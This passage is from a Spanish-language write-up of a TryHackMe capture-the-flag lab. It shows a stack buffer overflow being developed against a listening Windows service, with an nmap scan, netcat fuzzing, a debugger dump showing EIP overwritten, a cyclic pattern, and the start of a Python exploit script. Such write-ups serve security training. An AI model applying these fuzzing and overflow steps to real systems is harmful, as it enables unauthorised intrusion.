+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\S</span>hare<span style="color:#ae81ff">\g</span>atekeeper.exe of size <span style="color:#ae81ff">13312</span> as gatekeeper.exe <span style="color:#f92672">(</span>51,0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 51,0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="análisis-del-binario">Análisis del binario</h2>
+<p>Paso el binario a una máquina virtual con Windows 7 y con Inmunity Debugger para poder analizarlo. Lo primero que hago es abrirlo con Inmunity Debugger y ver que tipo de binario es. En este caso es un binario de 32 bits. Al ponerlo en marcha veo que se trata de un servidor que escucha en el puerto 31337. Hago un nmap a mi maquina de pruebas con el binario funcionando para seguir analizándolo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo nmap -sCV -sS -p- -T4 192.168.1.109
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-10-01 21:22 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.109
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00027s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65529</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc       Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open   lU      Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>2869/tcp  open  http        Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>5357/tcp  open  http        Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Service Unavailable
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>31337/tcp open  Elite?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   GenericLines: 
+</span></span><span style="display:flex;"><span>|     Hello 
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     Hello GET / HTTP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     Hello OPTIONS / HTTP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   Help: 
+</span></span><span style="display:flex;"><span>|     Hello HELP
+</span></span><span style="display:flex;"><span>|   Kerberos: 
+</span></span><span style="display:flex;"><span>|     Hello !!!
+</span></span><span style="display:flex;"><span>|   LDAPSearchReq: 
+</span></span><span style="display:flex;"><span>|     Hello <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   LPDString: 
+</span></span><span style="display:flex;"><span>|     Hello 
+</span></span><span style="display:flex;"><span>|     default!!!
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     Hello OPTIONS / RTSP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   SIPOptions: 
+</span></span><span style="display:flex;"><span>|     Hello OPTIONS sip:nm SIP/2.0
+</span></span><span style="display:flex;"><span>|     Hello Via: SIP/2.0/TCP nm;branch<span style="color:#f92672">=</span>foo
+</span></span><span style="display:flex;"><span>|     Hello From: &lt;sip:nm@nm&gt;;tag<span style="color:#f92672">=</span>root
+</span></span><span style="display:flex;"><span>|     Hello To: &lt;sip:nm2@nm2&gt;
+</span></span><span style="display:flex;"><span>|     Hello Call-ID: <span style="color:#ae81ff">50000</span>
+</span></span><span style="display:flex;"><span>|     Hello CSeq: <span style="color:#ae81ff">42</span> OPTIONS
+</span></span><span style="display:flex;"><span>|     Hello Max-Forwards: <span style="color:#ae81ff">70</span>
+</span></span><span style="display:flex;"><span>|     Hello Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Hello Contact: &lt;sip:nm@nm&gt;
+</span></span><span style="display:flex;"><span>|     Hello Accept: application/sdp
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span style="display:flex;"><span>|_    Hello
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port31337-TCP:V<span style="color:#f92672">=</span>7.94%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/1%Time<span style="color:#f92672">=</span>6519C74F%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>G
+</span></span><span style="display:flex;"><span>SF:etRequest,24,<span style="color:#e6db74">&#34;Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>SIPOptions,142,<span style="color:#e6db74">&#34;Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20&lt;sip:nm@n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:m&gt;;tag=root\r!!!\nHello\x20To:\x20&lt;sip:nm2@nm2&gt;\r!!!\nHello\x20Call-ID:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20&lt;sip:nm@nm&gt;\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,16,<span style="color:#e6db74">&#34;Hello\x20\r!!!\nHello\x20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTT
+</span></span><span style="display:flex;"><span>SF:POptions,28,<span style="color:#e6db74">&#34;Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,28,<span style="color:#e6db74">&#34;Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,F,<span style="color:#e6db74">&#34;Hello\x20HELP\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,C,<span style="color:#e6db74">&#34;Hello\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x16\x03!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,B,<span style="color:#e6db74">&#34;Hello\x20\x03!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSess
+</span></span><span style="display:flex;"><span>SF:ionReq,C,<span style="color:#e6db74">&#34;Hello\x20\x16\x03!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,A,<span style="color:#e6db74">&#34;Hello\x20!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Fou
+</span></span><span style="display:flex;"><span>SF:rOhFourRequest,47,<span style="color:#e6db74">&#34;Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,12,<span style="color:#e6db74">&#34;Hello\x20\x01de
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:fault!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,17,<span style="color:#e6db74">&#34;Hello\x200\x84!!!\nHello\x20\x01!!!\n&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:39:30:46 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: USUARIO-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: USUARIO-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:39:30:46 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-10-01T19:26:24
+</span></span><span style="display:flex;"><span>|_  start_date: 2023-10-01T19:15:01
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2:1:0: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional 6.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+</span></span><span style="display:flex;"><span>|   Computer name: usuario-PC
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: USUARIO-PC<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2023-10-01T21:26:25+02:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 286.07 seconds
+</span></span></code></pre></div><p>Pruebo el binario conectandome con netcat, observo el mismo comportamiento que en la máquina de TryHackMe. Supongo que los mensajes que acepte el binario deben tener un límite de caracteres, por lo que pruebo a enviarle un mensaje de 800 caracteres y veo que se rompe.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -vn 192.168.1.109 <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>Connection to 192.168.1.109 <span style="color:#ae81ff">31337</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
+</span></span><span style="display:flex;"><span>hello
+</span></span><span style="display:flex;"><span>Hello hello!!!
+</span></span><span style="display:flex;"><span>sam
+</span></span><span style="display:flex;"><span>Hello sam!!!
+</span></span><span style="display:flex;"><span>frodo
+</span></span><span style="display:flex;"><span>Hello frodo!!!
+</span></span><span style="display:flex;"><span>gollum
+</span></span><span style="display:flex;"><span>Hello gollum!!!
+</span></span></code></pre></div><p>Con este script, preparo un payload de 800 caracteres y lo envío al binario. En el EIP se puede ver el valor 41414141 que son las A</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python -c <span style="color:#e6db74">&#39;print(&#34;A&#34; * 800)&#39;</span>
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>❯ nc -vn 192.168.1.109 <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>Connection to 192.168.1.109 <span style="color:#ae81ff">31337</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
+</span></span><span style="display:flex;"><span>hi
+</span></span><span style="display:flex;"><span>Hello hi!!!
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></code></pre></div><p>Reviso Inmunity Debugger y compruebo el resultado obtenido en la dirección EIP. En el registro EIP se puede ver el valor 41414141 que son las A que he enviado en el payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">EAX</span> <span style="color:#a6e22e">FFFFFFFF</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ECX</span> <span style="color:#ae81ff">7</span><span style="color:#a6e22e">EFDA000</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EDX</span> <span style="color:#ae81ff">00002736</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EBX</span> <span style="color:#ae81ff">005</span><span style="color:#a6e22e">CF400</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ESP</span> <span style="color:#ae81ff">021319</span><span style="color:#a6e22e">F8</span> <span style="color:#a6e22e">ASCII</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EBP</span> <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ESI</span> <span style="color:#ae81ff">08041470</span> <span style="color:#a6e22e">gatekeep</span><span style="color:#ae81ff">.08041470</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EDI</span> <span style="color:#ae81ff">005</span><span style="color:#a6e22e">CF400</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EIP</span> <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">C</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">ES</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">P</span> <span style="color:#ae81ff">1</span>  <span style="color:#a6e22e">CS</span> <span style="color:#ae81ff">0023</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">SS</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Z</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">DS</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">S</span> <span style="color:#ae81ff">1</span>  <span style="color:#a6e22e">FS</span> <span style="color:#ae81ff">0053</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">7</span><span style="color:#a6e22e">EFDA000</span>(<span style="color:#a6e22e">FFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">T</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">GS</span> <span style="color:#ae81ff">002</span><span style="color:#a6e22e">B</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">bit</span> <span style="color:#ae81ff">0</span>(<span style="color:#a6e22e">FFFFFFFF</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">D</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">LastErr</span> <span style="color:#a6e22e">WSAENOTSOCK</span> (<span style="color:#ae81ff">00002736</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EFL</span> <span style="color:#ae81ff">00010286</span> (<span style="color:#a6e22e">NO</span>,<span style="color:#a6e22e">NB</span>,<span style="color:#a6e22e">NE</span>,<span style="color:#a6e22e">A</span>,<span style="color:#a6e22e">S</span>,<span style="color:#a6e22e">PE</span>,<span style="color:#a6e22e">L</span>,<span style="color:#a6e22e">LE</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST0</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST1</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST2</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST3</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST4</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST5</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST6</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ST7</span> <span style="color:#a6e22e">empty</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>      <span style="color:#a6e22e">E</span> <span style="color:#a6e22e">S</span> <span style="color:#a6e22e">P</span> <span style="color:#a6e22e">U</span> <span style="color:#a6e22e">O</span> <span style="color:#a6e22e">Z</span> <span style="color:#a6e22e">D</span> <span style="color:#a6e22e">I</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FST</span> <span style="color:#ae81ff">0000</span>  <span style="color:#a6e22e">Cond</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  <span style="color:#a6e22e">Err</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span>  (<span style="color:#a6e22e">GT</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FCW</span> <span style="color:#ae81ff">027</span><span style="color:#a6e22e">F</span>  <span style="color:#a6e22e">Prec</span> <span style="color:#a6e22e">NEAR</span>,<span style="color:#ae81ff">53</span>  <span style="color:#a6e22e">Mask</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Sabiendo esto, preparo un script de python para enviar un payload de 800 caracteres y comprobar si puedo sobreescribir el EIP con el valor 42424242 que son las B. En el registro EIP se puede ver el valor 42424242 que son las B que he enviado en el payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msf-pattern_create -l <span style="color:#ae81ff">800</span>
+</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
+</span></span></code></pre></div><p>Pero antes necesito conseguir el offset para saber cuantos caracteres tengo que enviar para sobreescribir el EIP. Para ello, envío el payload de 800 caracteres y obtengo el valor del ESP para calcular el offset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.109&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
